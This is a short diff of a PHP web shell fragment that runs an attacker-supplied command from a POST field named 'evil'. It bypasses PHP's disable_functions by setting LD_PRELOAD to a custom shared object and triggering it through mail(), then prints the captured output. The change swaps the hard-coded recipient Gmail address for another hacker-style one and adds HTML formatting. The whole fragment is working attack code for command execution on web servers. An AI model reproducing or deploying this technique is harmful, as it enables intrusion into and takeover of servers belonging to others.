@@ -7,9 +7,11 @@ if(isset($_POST["evil"])) {
 	putenv("LD_PRELOAD=./jtt.so");
 	putenv("EVIL_JTT=$evil > /tmp/jtt");
 	echo "<br><pre>Disable_functions : ".ini_get("disable_functions")."</pre>";
-	mail('androxghost1337@gmail.com','','','');
+	mail('lamonganblackhat7@gmail.com','','','');
 	if(!file_get_contents("/tmp/jtt")) {
+		echo "<br><br><hr><pre>";
 		echo "Not Vulnerable x_x";
+		echo "</pre><hr>";
 	} else {
 		$text = file_get_contents("/tmp/jtt");
 		echo "<br><br><hr><pre>";
